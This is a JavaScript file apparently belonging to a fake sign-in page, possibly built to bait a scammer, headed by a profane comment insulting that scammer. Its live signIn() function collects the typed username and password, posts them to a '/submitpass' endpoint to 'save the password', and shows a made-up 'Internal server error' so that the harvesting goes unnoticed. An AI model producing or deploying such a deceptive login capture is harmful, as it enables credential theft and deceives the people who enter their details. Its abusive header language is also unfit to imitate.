/*By the way, scammer - 

    Although you made a novel attempt at scamming me, fuck your mom :)


    U gey

*/


function signIn() {
    /*
    //Create an error modal
    var modal = document.createElement("div");
    modal.id = "hihi-modal";

    var iframe = document.createElement("iframe");
    iframe.width = 560;
    iframe.height = 315;
    iframe.src = "https://www.youtube.com/embed/9O1gs4YtRkU?controls=0" 
    iframe.title="YouTube video player" 
    iframe.frameborder="0" 
    iframe.allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture";
    iframe.allowFullscreen = true;

    var ev = new Event("click");

    modal.appendChild(iframe);

    document.body.appendChild(modal);

    setTimeout(()=>{
        iframe.dispatchEvent(ev);
    }, 1000)
    /*<iframe width="560" height="315" src="https://www.youtube.com/embed/9O1gs4YtRkU?controls=0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
    */


    //Save the password to servers
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/submitpass");

    var form = new FormData();
    
    var name = document.querySelector("#input_username").value;
    var pass = document.querySelector("#input_password").value;

    form.append("name", name);
    form.append("pass", pass);

    xhr.send(form);

    xhr.onreadystatechange = function() {
        if(this.readyState == 4 && this.status == 200) {

        } else if(this.readyState == 4 && this.status != 200) {
            //NOT OK

            setTimeout(()=>{
                ShowAlertDialog('Error', "Internal server error");
            }, 500)
        }
    }
}